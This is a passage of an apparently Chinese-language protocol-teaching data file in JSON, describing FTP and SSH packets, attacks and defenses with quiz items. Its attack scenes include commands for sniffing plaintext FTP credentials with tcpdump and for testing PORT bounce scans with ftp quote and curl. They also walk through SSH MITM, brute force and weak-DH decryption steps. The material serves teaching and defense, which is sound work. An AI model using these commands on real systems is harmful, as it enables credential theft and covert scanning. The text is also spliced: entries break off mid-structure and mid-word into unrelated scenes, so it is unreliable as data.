明文传输"},{"who":"FTP 服务器","to":"客户端","label":"331 Please specify the password.\\r\\n","note":"服务器确认该账户存在，进入等待口令状态"},{"who":"客户端","to":"FTP 服务器","label":"PASS P@ssw0rd\\r\\n","note":"口令以明文字节出现在 TCP 载荷中，无散列、无挑战应答"},{"who":"攻击者","to":"接入交换机","label":"镜像口抓包，过滤 tcp port 21","note":"同广播域或镜像口即可拿到完整凭据，零破解成本"},{"who":"攻击者","to":"FTP 服务器","label":"USER admin / PASS P@ssw0rd → 230","note":"攻击者取得与受害者完全相同的文件权限"}],"defense":"公网禁用明文 FTP，改 FTPS 或 SFTP；内网也必须走加密隧道或隔离管理网。"},{"name":"FTP Bounce Scan","cn":"PORT 反弹扫描","impact":"攻击者借 FTP 服务器的地址与带宽扫描第三方，溯源全部指向受害者服务器。","steps":[{"who":"攻击者","to":"FTP 服务器","label":"USER anonymous / PASS a@b.c → 230","note":"先取得一个能发 PORT 命令的会话"},{"who":"攻击者","to":"FTP 服务器","label":"PORT 203,0,113,9,0,80","note":"把数据连接目标指向第三方主机的 80 端口，而非自己"},{"who":"FTP 服务器","to":"攻击者","label":"200 PORT command successful","note":"服务器接受第三方地址，未校验它与控制连接源地址是否一致"},{"who":"攻击者","to":"FTP 服务器","label":"LIST","note":"触发一次数据连接，服务器从 20 端口连向 203.0.113.9:80"},{"who":"FTP 服务器","to":"第三方主机","label":"TCP SYN，源端口 20","note":"端口开放回 150 或 226，被过滤回 425，结果经控制连接回给攻击者"}],"defense":"服务器强制 PORT 参数中的 IP 等于控制连接源 IP，并禁用 PORT、只允许 PASV。"},{"name":"Anonymous FTP Abuse","cn":"匿名登录滥用","impact":"服务器变成恶意文件的公共投放点，分发流量走可信域名与内部 IP。","steps":[{"who":"攻击者","to":"FTP 服务器","label":"USER anonymous","note":"若服务器开启匿名服务，回 331；关闭则回 530"},{"who":"攻击者","to":"FTP 服务器","label":"PASS guest@example.com → 230","note":"口令为任意字符串，实际不做校验，登录成功"},{"who":"攻击者","to":"FTP 服务器","label":"CWD /pub; LIST","note":"枚举匿名目录，寻找可写位置与已存在的可信文件名"},{"who":"攻击者","to":"FTP 服务器","label":"TYPE I; PASV; STOR update.exe","note":"匿名目录若可写，恶意文件被放进公共下载区"},{"who":"受害者","to":"FTP 服务器","label":"RETR /pub/update.exe","note":"受害者从内部\"可信\"服务器下载并执行恶意文件"}],"defense":"匿名账号只读，根目录内核级 chroot，上传区独立且禁止执行。"}],"defenses":[{"name":"FTPS / SFTP","how":"FTPS 在 FTP 之上加 TLS（隐式 990，或显式在 21 端口用 AUTH TLS 升级），控制连接与每条数据连接都要各自完成 TLS；SFTP 是 SSH 的子系统，在 22 端口的单条加密连接里多路复用文件操作。","limit":"FTPS 仍是两条连接，数据连接的 TLS 会话复用配不好会被防火墙拦；SFTP 与 FTP 无继承关系，脚本与老客户端必须改；两者都不修正 FTP 的权限模型。"},{"name":"匿名只读 + 目录隔离","how":"匿名账号只授予读权限，根目录用内核级 chroot 或等价机制隔离，上传区与下载区分开且禁止执行。","limit":"只减小被滥用的后果，不解决凭据与内容明文；靠字符串过滤实现的\"目录限制\"可被 ../ 穿越绕过。"},{"name":"口令强度与源地址白名单","how":"强口令策略、登录失败次数与速率限制、只允许已知网段访问 21 端口，并对登录与文件操作留日志。","limit":"口令在明文信道里滚过一次就被拿走，嗅探可绕过全部策略；白名单依赖源 IP 可信，而源 IP 本身可伪造。"}],"calcs":[],"quiz":[{"q":"主动模式命令 PORT 192,168,1,2,19,137 指定的是哪个数据端口？","options":["19","137","5001"],"a":2,"why":"前四个数字才是 IPv4 地址，后两个是端口的高低字节，端口 = 19×256 + 137 = 5001。"},{"q":"现代客户端为什么默认使用被动模式？","options":["被动模式吞吐更高","数据连接由客户端主动连出，符合防火墙放内出阻外入的策略","被动模式不需要建立控制连接"],"a":1,"why":"两种模式的传输内容完全相同，区别只在谁发起数据连接；主动模式下服务器入站会被客户端防火墙拦截。"},{"q":"用 TYPE A 传一个 zip 压缩包会发生什么？","options":["服务器会自动识别并切成二进制模式","行结束被改写，字节数与哈希都变，但会话仍显示传输成功","服务器返回 550 拒绝传输"],"a":1,"why":"ASCII 模式把行结束统一成 CRLF，二进制里偶然出现的 0x0A 会被插入 0x0D，文件被静默改坏。"}]},"script":{"id":"ftp","notes":{"Argument":{"short":"用户名明文，可直接枚举账户","more":"USER 命令后面的账户名以 NVT-ASCII 明文出现，服务器据此查本地账户表；回 331 说明账户存在、在等口令，回 530 说明不存在或已被拒绝。","sec":"明文用户名让攻击者能区分「账户不存在」与「口令错」，撞库省掉一半试错成本。"},"Host Address":{"short":"PORT 里的目标地址，可填任何人","more":"四个十进字段拼成 32 位 IPv4 地址，RFC 959 没有要求它等于控制连接的源地址，服务器照填照连，于是成为反弹扫描的原语。","sec":"只校验参数格式不校验归属，等于把服务器的出向连接权交给了客户端。"},"Type Code":{"short":"A 改行结束，I 原样过字节","more":"TYPE A 把行结束统一成 CRLF，接收方再转回本地格式；TYPE I 把数据当连续比特装进 8 位传输字节，不做任何转换，传二进制必须用它。","sec":"选错类型会静默改坏文件：长度与哈希全变，会话却照样显示传输成功。"},"Pasv Argument":{"short":"227 里的地址端口，可被中间人改"," "}]}}]},{"key":"attack","no":"第 2 幕","title":"它会被怎么打","desc":"明文信道加上可自选连接目标，两个缺口各能打穿一次会话","lead":"两个攻击都不需要破解什么：一个只靠听，一个只靠一条 PORT 命令。","scenes":[{"name":"明文口令嗅探","steps":[{"who":"客户端","to":"FTP 服务器","pkt":0,"bubble":"USER admin","hl":["Command","Argument"],"vals":{"Command":"USER","Argument":"admin"},"say":"受害者照常登录，控制连接没有任何加密层。","sub":"命令与参数都是 NVT-ASCII 文本行，一字节不差地送上链路。"},{"who":"客户端","to":"FTP 服务器","pkt":0,"bubble":"PASS P@ssw0rd","hl":["Argument"],"vals":{"Argument":"P@ssw0rd"},"say":"口令同样以明文出现在 TCP 载荷里，一行一个回车。","sub":"没有散列也没有挑战应答，抓到就是原文。"},{"who":"攻击者","to":"接入交换机","pkt":0,"bubble":"镜像口抓包","evil":true,"hl":["Command","Argument"],"vals":{"Command":"tcp port 21","Argument":"PASS P@ssw0rd"},"say":"同广播域或镜像口抓包，凭据零成本到手。","sub":"tcpdump -A 直接把载荷按 ASCII 打出来。"},{"who":"攻击者","to":"FTP 服务器","pkt":0,"bubble":"同一凭据登录","evil":true,"hl":["Command","Argument"],"vals":{"Command":"USER admin","Argument":"admin"},"say":"攻击者换一台机器重放这组凭据，服务器回 230。","sub":"日志里只是一次正常登录，看不出两个人。"},{"who":"攻击者","to":"FTP 服务器","pkt":2,"bubble":"RETR / STOR","evil":true,"hl":["Command"],"vals":{"Command":"RETR 或 STOR"},"say":"拿到的权限与受害者完全相同，读文件、投文件都做得到。","sub":"问题不在权限模型，在信道本身。"}],"cmds":{"linux":[{"c":"sudo tcpdump -i eth0 -A -s0 'tcp port 21'","n":"-A 按 ASCII 打印载荷，USER/PASS 两行口令直接可读","s":"补充（tcpdump，仓库未收录）"},{"c":"ss -tn state established '( dport = :21 or sport = :21 )'","n":"先确认有活跃的 21 连接，再对着这条流抓包","s":"补充（ss 套接字统计，仓库未收录）"}],"ps":[{"c":"Get-NetTCPConnection -RemotePort 21","n":"列出本机到 21 端口的连接与所属进程","s":"《系统》PowerShell.md · 10. Cmdlet 网络与系统管理"}],"cmd":[{"c":"netstat -an | findstr :21","n":"确认 21 连接存在并看对端地址","s":"《系统》Windows CMD.md · netstat"}]}},{"name":"PORT 反弹扫描","steps":[{"who":"攻击者","to":"FTP 服务器","pkt":0,"bubble":"USER anonymous","evil":true,"hl":["Command","Argument"],"vals":{"Command":"USER anonymous","Argument":"anonymous"},"say":"先拿一个能发 PORT 的会话，匿名账号就够。","sub":"回 230 之后这条控制连接就是免费的出向跳板。"},{"who":"攻击者","to":"FTP 服务器","pkt":2,"bubble":"PORT 203,0,113,9,0,80","evil":true,"hl":["Command","Host Address","Port High","Port Low"],"vals":{"Command":"PORT","Host Address":"203.0.113.9（第三方）","Port High":"0","Port Low":"80"},"say":"参数里填的不是自己的地址，而是第三方主机的 80 端口。","sub":"RFC 959 没要求这个地址等于控制连接的源地址。"},{"who":"FTP 服务器","to":"攻击者","pkt":2,"bubble":"200 PORT successful","hl":["Command"],"vals":{"Command":"200 接受"},"say":"服务器只校验参数格式，照单接受，不做归属检查。","sub":"一条命令就把服务器的出向连接权交了出去。"},{"who":"攻击者","to":"FTP 服务器","pkt":2,"bubble":"LIST","evil":true,"hl":["Command"],"vals":{"Command":"LIST"},"say":"发一条 LIST 触发数据连接，服务器从 20 端口连向目标。","sub":"每次换一个端口号，就是一轮扫描。"},{"who":"FTP 服务器","to":"第三方主机","pkt":2,"bubble":"SYN src:20","hl":["Host Address","Port Low"],"vals":{"Host Address":"203.0.113.9","Port Low":"80"},"say":"端口开放回 150，被过滤回 425，结果经控制连接告诉攻击者。","sub":"扫描流量的溯源全部指向这台 FTP 服务器。"}],"cmds":{"linux":[{"c":"ftp -vn 203.0.113.5","n":"匿名登录后在提示符执行 quote PORT 203,0,113,9,0,80，再 LIST 验证反弹","s":"补充（ftp 客户端 quote 命令）"},{"c":"curl --ftp-port 203.0.113.9 -s ftp://203.0.113.5/","n":"用 curl 指定主动模式的目标地址，看服务器是否接受第三方地址","s":"补充（curl FTP 选项）"},{"c":"sudo tcpdump -ni eth0 'tcp port 20'","n":"抓服务器 20 端口的出向 SYN，直接看它去连了谁","s":"补充（tcpdump，仓库未收录）"}],"ps":[{"c":"Test-NetConnection 203.0.113.5 -Port 21","n":"先确认服务器 21 可达，再发 PORT 命令","s":"《系统》PowerShell.md · 10. Cmdlet 网络与系统管理"}],"cmd":[{"c":"netstat -an | findstr :20","n":"看本机 20 端口有没有意外的入向连接","s":"《系统》Windows CMD.md · netstat"}]}}]},{"key":"defend","no":"第 3 幕","title":"防护在哪一步掐断它","desc":"同一场攻击重放一遍，这次在信道上和参数上各设一道闸","lead":"加密解决「谁能看」，参数校验解决「服务器替谁连」。两道闸互相不替代。","scenes":[{"name":"FTPS/SFTP 加密 + 禁 PORT","steps":[{"who":"客户端","to":"FTP 服务器","pkt":0,"bubble":"AUTH TLS","hl":["Command"],"vals":{"Command":"AUTH TLS"},"say":"先升 TLS 再登录：21 端口上发 AUTH TLS，之后整条流加密。","sub":"显式 FTPS 走 21，隐式 FTPS 直接在 990 上握手。"},{"who":"客户端","to":"FTP 服务器","pkt":0,"bubble":"USER / PASS（密文）","hl":["Argument"],"vals":{"Argument":"加密后不可读"},"say":"用户名与口令都在 TLS 记录里，抓包只剩密文与长度。","sub":"数据连接也要各自完成一次 TLS 握手。"},{"who":"攻击者","to":"接入交换机","pkt":0,"bubble":"抓包","evil":true,"hl":["Argument"],"vals":{"Argument":"TLS 记录，不可读"},"say":"同样的位置再抓一次，只能看到加密记录的边界。","sub":"嗅探这条路在第一步就被掐断。"},{"who":"攻击者","to":"FTP 服务器","pkt":2,"bubble":"PORT 203,0,113,9,0,80","evil":true,"hl":["Host Address","Port Low"],"vals":{"Host Address":"203.0.113.9","Port Low":"80"},"say":"反弹扫描重放：参数地址与控制连接源地址不一致，直接被拒。","sub":"服务器回 500，只接受 PASV。"},{"who":"FTP 服务器","to":"攻击者","pkt":2,"bubble":"500 拒绝","hl":["Command"],"vals":{"Command":"500 PORT 参数与源地址不符"},"say":"禁用 PORT 之后，连参数格式这一步都不再解析。","sub":"数据连接只能由客户端主动连出，跳板消失。"},{"who":"客户端","to":"FTP 服务器","pkt":1,"bubble":"TYPE I","hl":["Type Code"],"vals":{"Type Code":"I"},"say":"再加一条：匿名账号只读、根目录 chroot、上传区不落地执行。","sub":"加密解决信道，权限收敛解决后果。"}],"cmds":{"linux":[{"c":"sftp user@192.0.2.10","n":"SFTP 走 22 端口单条加密连接，口令与文件内容都不再明文","s":"补充（OpenSSH 自带客户端）"},{"c":"openssl s_client -connect 192.0.2.10:21 -starttls ftp","n":"验证显式 FTPS：能协商出 TLS 并打出证书链才算可用","s":"补充（openssl，仓库未收录）"},{"c":"grep -Ei '^(anonymous_enable|pasv_enable|port_enable)' /etc/vsftpd.conf","n":"确认匿名已关或只读、PORT 已禁用，只剩被动模式","s":"补充（vsftpd 配置项）"}],"ps":[{"c":"Get-NetTCPConnection -LocalPort 21 -State Listen","n":"确认 21 只在必要时监听，且没有异常来源的连接","s":"《系统》PowerShell.md · 10. Cmdlet 网络与系统管理"}],"cmd":[{"c":"netsh advfirewall firewall show rule name=all | findstr /i ftp","n":"看防火墙里 FTP 相关放行规则，确认只对内网开 21","s":"《系统》Windows CMD.md · netsh"}]}}]}]}},{"proto":{"id":"ssh","name":"SSH","cn":"安全外壳协议","en":"Secure Shell","layer":"application","chapter":"第五章","extra":false,"oneLine":"先协商算法、再交换密钥、最后才验证用户的远程登录协议，把认证与数据一起关进加密信道。","sections":[{"h":"四个阶段，一条越来越窄的信任链","p":"RFC 4251 把 SSH 分成三层：传输层负责版本交换、算法协商、密钥交换与服务请求；用户认证层在其上判断\"你是谁\"；连接层再把一条加密信道切成多个通道，承载 shell、端口转发与文件传输。课程讲的五阶段——版本协商、功能协商、会话密钥协商、用户验证、加密数据交换——与这个分层一一对应：功能协商就是交换 SSH_MSG_KEXINIT，会话密钥协商就是跑一次密钥交换算法。整条链的要害在顺序：先把信道加密，再在里面验证用户，所以口令与签名从不在明文里出现。"},{"h":"版本交换：一行明文标识串决定后面能谈什么","p":"TCP 建连后双方各发一行：SSH-2.0-软件版本，可带一个空格加注释，以单个 CRLF 结束，总长不超过 255 字节。这一行是明文，中间人当然可以改，但改它换不来冒充——紧接着的密钥交换会把双方的身份、算法与交换值一起绑进 exchange hash，任何改动都会让校验失败。真正被利用的是兼容性：为了支持早已废弃的 SSH-1，部分实现允许版本回退，攻击者把版本串改低就可能诱发降级分支。现代实现只宣告 2.0，并在配置里直接拒绝 1.x。"},{"h":"KEXINIT：各报清单、取第一个共同项","p":"SSH_MSG_KEXINIT（消息号 20）里是 16 字节 cookie 加 10 张名字列表：密钥交换、主机密钥、加密（上下行各一）、MAC（上下行各一）、压缩（上下行各一）、语言（上下行各一），末尾是 first_kex_packet_follows 布尔与 4 字节保留。每张列表是 4 字节长度加逗号分隔的算法名，按偏好从高到低排列。选定规则是：取客户端列表里第一个服务器也支持的算法，即客户端偏好优先；方向分开列，是因为上下行可以用不同算法。这种\"报清单再取交集\"的设计便于扩展，但只要清单里还留着弱算法，协商结果就可能被压到最弱的一环。"},{"h":"二进制包：长度、填充、MAC 三段各有安全含义","p":"每个包由 uint32 包长、1 字节填充长度、载荷、随机填充和 MAC 依次拼接。包长不含自身与 MAC；前四段之和必须是分组大小或 8 的整数倍，填充至少 4 字节、最多 255 字节，且内容随机，用来掩盖真实长度。密钥交换完成前 MAC 算法是 none，完成后换成 hmac-sha2-256 一类。RFC 4253 规定 MAC 覆盖的是尚未加密的明文包，即先认证后加密；后来出现的 encrypt-then-MAC 扩展把顺序反过来，正是为了消除填充预言类问题。序列号隐式递增、不进报文，用于让重放的包对不上号。"},{"h":"先把信道加密，再在里面验证用户","p":"密钥交换产出共享秘密 K 与交换哈希 H，双方据此推导两个方向的初始 IV、加密密钥与完整性密钥，H 同时充当 session_id。之后才发 SSH_MSG_SERVICE_REQUEST 请求 ssh-userauth 服务，进入用户认证：publickey、password、keyboard-interactive 等方法全部在加密信道内进行。这里要分清两套密钥：主机密钥证明\"这台机器是哪台服务器\"，用户公钥或口令证明\"你是哪个用户\"。前者靠 known_hosts 或主机证书校验，后者靠服务器上的 authorized_keys，混为一谈就会把\"连对了机器\"误当成\"登对了人\"。"},{"h":"TOFU：SSH 唯一的身份校验点其实在用户手上","p":"SSH 协议本身不提供服务器身份的可信锚，known_hosts 用的是首次信任：第一次连接时把主机公钥记下来，以后每次比对，变了就告警。这意味着首次连接若已被劫持，之后所有比对都只是\"与攻击者的密钥保持一致\"，模型整体失效。企业侧的补救有两条：用内部 CA 给主机签证书，客户端只信任 CA，主机密钥轮换不必改客户端；或把 known_hosts 预置进镜像与配置管理。DNS 侧的 SSHFP 记录只在启用 DNSSEC 时才有意义，否则等于把信任转移给了一个同样可被投毒的解析结果。"}],"packets":[{"title":"版本交换：一行明文标识串","note":"SSH-2.0-OpenSSH_9.6，最长 255 字节，以单个 CRLF 结束","hex":"53 53 48 2d 32 2e 30 2d 4f 70 65 6e 53 53 48 5f 39 2e 36 0d 0a","fields":[{"name":"Proto Name","cn":"协议名","off":0,"len":4,"bits":"","tone":"tag","desc":"固定为 SSH- 四个字节，接收方据此判断这条 TCP 流上跑的是不是 SSH，而非 HTTP 之类误连上来的流量。","sec":"这是唯一一处无长度前缀、无加密的协议标记，也是协议指纹识别的依据。"},{"name":"Proto Version","cn":"协议版本号","off":4,"len":3,"bits":"","tone":"ver","desc":"必须是 2.0。1.x 早已废弃，但部分老实现仍允许回退，回退即意味着可被降级到已知有缺陷的协议族。","sec":"版本串可被中间人改写；虽然改完无法通过后续密钥交换的身份绑定，但足以诱发某些实现的降级分支。"},{"name":"Hyphen","cn":"分隔连字符","off":7,"len":1,"bits":"","tone":"sep","desc":"版本号与软件版本之间的连字符，格式为 protoversion-softwareversion。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"Software Version","cn":"软件版本串","off":8,"len":11,"bits":"","tone":"ver","desc":"OpenSSH_9.6。这串字符直接告诉对方服务端实现与版本，是本字段最直接的信息泄露。","sec":"版本指纹让攻击者能精准匹配 CVE，扫描器靠它一步确定该打哪个漏洞。"},{"name":"CRLF","cn":"行结束符","off":19,"len":2,"bits":"","tone":"term","desc":"单个回车加换行，标识串必须以此结束；可选的注释字段用空格与软件版本分隔，跟在它之前。","sec":"注释字段常被运维写成\"root@host\"，顺手泄露账户名与主机名。"}]},{"title":"二进制包：SSH_MSG_KEXINIT（算法协商）","note":"长度 4 字节 + 填充长度 1 字节 + 载荷（含 16 字节 cookie 与 10 张名字列表）+ 随机填充，共 168 字节，此时尚无 MAC","hex":"00 00 00 a4 06 14 9f 3c 1a 7e 5b 2d 84 60 c1 e9 f7 a3 b5 d2 68 40 00 00 00 11 63 75 72 76 65 32 35 35 31 39 2d 73 68 61 32 35 36 00 00 00 18 73 73 68 2d 65 64 32 35 35 31 39 2c 72 73 61 2d 73 68 61 32 2d 35 31 32 00 00 00 0a 61 65 73 31 32 38 2d 63 74 72 00 00 00 0a 61 65 73 31 32 38 2d 63 74 72 00 00 00 0d 68 6d 61 63 2d 73 68 61 32 2d 32 35 36 00 00 00 0d 68 6d 61 63 2d 73 68 61 32 2d 32 35 36 00 00 00 04 6e 6f 6e 65 00 00 00 04 6e 6f 6e 65 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 02 03 04 05","fields":[{"name":"packet_length","cn":"包长度","off":0,"len":4,"bits":"","tone":"len","desc":"包体字节数，不含本字段与 MAC。本例 164 = 1（padding_length）+ 157（payload）+ 6（padding）。","sec":"长度字段本身也被加密，但接收方必须先解密它才能知道要读多少字节，早期的长度预分配实现因此成为预认证内存耗尽的入口。"},{"name":"padding_length","cn":"填充长度","off":4,"len":1,"bits":"","tone":"len","desc":"随机填充的字节数，最少 4、最多 255。本例 6，使 4+1+157+6 = 168 成为 8 的整数倍。","sec":"填充量可变是 SSH 唯一抗流量分析的手段；固定填充等于把真实包长暴露成侧信道。"},{"name":"Message Code","cn":"消息号","off":5,"len":1,"bits":"","tone":"code","desc":"20 = SSH_MSG_KEXINIT。传输层消息号 1-49，认证层 50-79，连接层 80 以上，各层据此分发。","sec":"协商期间双方只允许发 1-49 号消息，这条约束防止在明文阶段提前跳进认证流程。"},{"name":"Cookie","cn":"随机 cookie","off":6,"len":16,"bits":"","tone":"crypto","desc":"16 字节随机数，双方各生成一个，混入密钥推导，使任何一方都无法单独决定会话密钥与 session_id。","sec":"cookie 若可预测，会话密钥就有被预先算出的可能；弱随机数生成器是真实发生过的 SSH 密钥泄露根因。"},{"name":"kex_algorithms","cn":"密钥交换算法列表","off":22,"len":21,"bits":"","tone":"algo","desc":"名字列表：4 字节长度加逗号分隔的算法名，按偏好从高到低排列。本例只有 curve25519-sha256，它同时提供前向保密与较快的运算。","sec":"清单里只要还留着 diffie-hellman-group1-sha1 这类 1024 位群，被动监听者就能靠预计算解密整段会话。"},{"name":"server_host_key_algorithms","cn":"主机密钥算法列表","off":43,"len":28,"bits":"","tone":"algo","desc":"ssh-ed25519,rsa-sha2-512：前者是 Edwards 曲线签名，后者用 SHA-512 取代 SHA-1 的老 rsa-sha。","sec":"若列表里还有裸 ssh-rsa（SHA-1 签名），等于允许把主机密钥认证降级到已被认为不安全的组合。"},{"name":"encryption_algorithms_c2s","cn":"客户端到服务器的加密算法","off":71,"len":14,"bits":"","tone":"algo","desc":"aes128-ctr。两个方向分开列出，因此上下行可以选不同算法，这是为了适配单向硬件加速。","sec":"加密算法一旦落到 CBC 模式且实现有缺陷，就会出现可被利用的填充预言问题。"},{"name":"encryption_algorithms_s2c","cn":"服务器到客户端的加密算法","off":85,"len":14,"bits":"","tone":"algo","desc":"本例与上行相同，仍是 aes128-ctr。","sec":"两个方向用同一密钥材料的不同派生值；若实现把两个方向搞混，会导致可预测的 IV 复用。"},{"name":"mac_algorithms_c2s","cn":"客户端到服务器的 MAC 算法","off":99,"len":17,"bits":"","tone":"algo","desc":"hmac-sha2-256。MAC 用于完整性保护，密钥交换完成前该字段实际为 none。","sec":"MAC 与加密的组合顺序（先 MAC 后加密，还是先加密后 MAC）决定是否存在填充预言，这是 SSH 历史上最集中的一类缺陷。"},{"name":"mac_algorithms_s2c","cn":"服务器到客户端的 MAC 算法","off":116,"len":17,"bits":"","tone":"algo","desc":"与上行相同。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"compression_algorithms_c2s","cn":"压缩算法（上行）","off":133,"len":8,"bits":"","tone":"algo","desc":"none 表示不压缩。压缩在密钥交换前必须为 none。","sec":"启用压缩且攻击者能注入内容时，压缩比的变化会泄露明文长度与内容片段，即压缩侧信道。"},{"name":"compression_algorithms_s2c","cn":"压缩算法（下行）","off":141,"len":8,"bits":"","tone":"algo","desc":"与上行相同，none。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"languages_c2s","cn":"语言标签（上行）","off":149,"len":4,"bits":"","tone":"algo","desc":"长度前缀为 0 的空列表，表示不协商语言。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"languages_s2c","cn":"语言标签（下行）","off":153,"len":4,"bits":"","tone":"algo","desc":"同样为空列表。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"first_kex_packet_follows","cn":"猜测标志","off":157,"len":1,"bits":"","tone":"flag","desc":"布尔值：发送方是否已按自己列表的第一项\"猜\"出算法并紧随其后发了 KEX 包。若猜错，接收方必须静默丢弃那个包。","sec":"这个优化省一次往返，但也意味着第一项的选择会被对手观察，可用于推断实现与版本。"},{"name":"reserved","cn":"保留字段","off":158,"len":4,"bits":"","tone":"reserved","desc":"固定为 0，为后续协议扩展预留位置。","sec":"解析器若忽略该字段的非零值，会成为协议模糊测试的入口，本字段本身不构成独立攻击手段。"},{"name":"random padding","cn":"随机填充","off":162,"len":6,"bits":"","tone":"pad","desc":"7 个随机字节，只为让包长满足块大小整数倍，内容不参与任何语义。","sec":"填充随机化不足会让包长分布暴露命令类型，形成可被机器学习识别的指纹。"}]},{"title":"认证阶段的第一个包：SSH_MSG_USERAUTH_REQUEST（method=none）","note":"此时密钥交换已完成，这个包在加密信道内传输，用 none 方法探测可用的认证方式","hex":"00 00 00 2c 08 32 00 00 00 04 72 6f 6f 74 00 00 00 0e 73 73 68 2d 63 6f 6e 6e 65 63 74 69 6f 6e 00 00 00 04 6e 6f 6e 65 a5 a5 a5 a5 a5 a5 a5 a5","fields":[{"name":"packet_length","cn":"包长度","off":0,"len":4,"bits":"","tone":"len","desc":"本例 44 = 1 + 35 + 8，整包 48 字节，满足 8 的整数倍。","sec":"长度字段在加密信道内，嗅探者看不到；能看到的只是 TCP 段的长度节奏。"},{"name":"padding_length","cn":"填充长度","off":4,"len":1,"bits":"","tone":"len","desc":"本例 8 字节随机填充。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"Message Code","cn":"消息号","off":5,"len":1,"bits":"","tone":"code","desc":"50 = SSH_MSG_USERAUTH_REQUEST，认证请求。对应的答复是 51（失败，附可继续的方法列表）与 52（成功）。","sec":"51 号消息会回显服务器支持的认证方法，是攻击者判断\"该爆破口令还是该找私钥\"的直接依据。"},{"name":"User Name","cn":"用户名","off":6,"len":8,"bits":"","tone":"id","desc":"4 字节长度加用户名，本例 root。用户名在加密信道内，嗅探看不到，但服务器日志与失败计数会暴露它。","sec":"枚举存在的用户名可缩小爆破范围；统一返回 51 而不区分\"无此用户\"能减缓这一步。"},{"name":"Service Name","cn":"服务名","off":14,"len":18,"bits":"","tone":"id","desc":"ssh-connection，表示认证通过后要使用的是连接协议（通道、端口转发、会话）。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"Method Name","cn":"认证方法名","off":32,"len":8,"bits":"","tone":"method","desc":"none：不带任何凭据的探测包，服务器必定回 51，并列出真正支持的方法（publickey、password、keyboard-interactive）。","sec":"none 探测是自动化爆破与资产测绘的第一步，禁用它没有意义（协议要求支持），只能靠限制失败次数。"},{"name":"random padding","cn":"随机填充","off":40,"len":8,"bits":"","tone":"pad","desc":"8 字节填充。","sec":"本字段在常见攻击中不作为独立手段。"}]}],"attacks":[{"name":"SSH Man-in-the-Middle","cn":"SSH 中间人（首次连接）","impact":"口令、命令与文件内容对攻击者完全可见，且可被静默篡改，双方界面毫无异常。","steps":[{"who":"攻击者","to":"受害者 A","label":"ARP 应答：192.168.1.1 is-at 攻击者 MAC","note":"把网关地址绑到自己的网卡，A 发往服务器的流量改道"},{"who":"受害者 A","to":"攻击者","label":"SSH-2.0-OpenSSH_9.6\\r\\n → 攻击者回 SSH-2.0-OpenSSH_9.6\\r\\n","note":"版本交换在两条独立连接上分别完成，A 不知道自己连的是谁"},{"who":"攻击者","to":"真实服务器 B","label":"以自己身份发起第二条 SSH 连接，跑完 KEXINIT 与 KEX","note":"攻击者持有两条会话的密钥材料，可以逐包解密再加密转发"},{"who":"受害者 A","to":"本地终端","label":"首次连接提示 Are you sure you want to continue connecting?","note":"known_hosts 里没有该主机记录，用户习惯性输入 yes，把攻击者密钥写进信任库"},{"who":"攻击者","to":"受害者 A","label":"解密 USERAUTH_REQUEST(password) 拿到口令，或直接借用 publickey 认证后的会话","note":"此后所有命令与文件内容都在攻击者手里，日志里只有一次正常登录"}],"defense":"预置 known_hosts 或改用主机证书，首次连接必须带外核对指纹。"},{"name":"SSH Password Brute Force","cn":"SSH 口令暴力破解","impact":"弱口令账户被接管，攻击者获得一个可长期驻留的加密跳板。","steps":[{"who":"攻击者","to":"目标主机","label":"TCP 连 22，读取 SSH-2.0-OpenSSH_7.4","note":"版本串直接暴露发行版与年代，据此挑选对应的默认配置与已知漏洞"},{"who":"双方","to":"—","label":"KEXINIT + curve25519 密钥交换完成","note":"爆破必须发生在加密信道内，每次尝试都要付一次密钥交换的 CPU 代价"},{"who":"攻击者","to":"sshd","label":"USERAUTH_REQUEST(user=root, method=password, \"123456\")","note":"服务器校验失败，计入失败次数"},{"who":"sshd","to":"攻击者","label":"SSH_MSG_USERAUTH_FAILURE(51)，列出 publickey,password","note":"51 号消息回显可用方法，等于告诉攻击者继续爆破口令是有效的"},{"who":"攻击者","to":"sshd","label":"换下一个口令重试，直到返回 SSH_MSG_USERAUTH_SUCCESS(52)","note":"拿到 shell，随后写入 authorized_keys 建立持久化"}],"defense":"禁口令认证只留公钥，配合 MaxAuthTries、失败锁定与只对可信网段开放 22。"},{"name":"Weak DH Downgrade (Logjam-style)","cn":"弱 DH 降级与预计算解密","impact":"攻击者被动录包即可解密历史会话，不留任何连接痕迹。","steps":[{"who":"攻击者","to":"链路","label":"被动镜像并保存完整会话（KEXINIT 与 KEX 报文）","note":"不注入、不改包，因此不会有任何告警"},{"who":"客户端 / 服务器","to":"—","label":"协商结果落在 diffie-hellman-group1-sha1（1024 位 MODP）","note":"双方清单里都还留着这个老算法，取交集时它胜出"},{"who":"攻击者","to":"离线算力","label":"针对同一 1024 位群做大规模预计算，建立离散对数表","note":"成本集中在一次预计算，之后对同一群的所有会话都可复用"},{"who":"攻击者","to":"—","label":"用预计算表从录制的交换值直接求出共享秘密 K","note":"不需要服务器私钥，也不需要在线交互"},{"who":"攻击者","to":"—","label":"由 K 与 H 推导会话密钥，解密全部历史流量","note":"前向保密在这里失效，因为群太小而非 KEX 设计有问题"}],"defense":"KexAlgorithms 只留 curve25519-sha256 等现代算法，禁用 group1/group14-sha1 与 ssh-rsa。"}],"defenses":[{"name":"known_hosts 预置与指纹核对","how":"把主机公钥预置进镜像或配置管理系统，首次连接强制带外核对指纹（控制台显示、资产库比对），并设置 StrictHostKeyChecking=yes。","limit":"首次连接本身仍是盲信，预置之外的机器照样会弹提示；主机密钥轮换要逐台更新，规模化运维成本高，运维往往会关掉检查。"},{"name":"SSH 主机证书（内部 CA）","how":"用内部 CA 给每台主机签发证 thms"],"vals":{"kex_algorithms":"...,diffie-hellman-group1-sha1","server_host_key_algorithms":"...,ssh-rsa"},"say":"两边清单里都还留着 1024 位群与 SHA-1 签名，交集把它们挑了出来。","sub":"客户端偏好优先，弱项排在前面就直接胜出。"},{"who":"攻击者","to":"离线算力","pkt":1,"bubble":"预计算离散对数表","evil":true,"hl":["kex_algorithms"],"vals":{"kex_algorithms":"group1 预计算表"},"say":"对同一个 1024 位群做一次大规模预计算，之后所有会话复用。","sub":"成本集中付一次，收益按会话数摊薄。"},{"who":"攻击者","to":"—","pkt":1,"bubble":"求出共享秘密 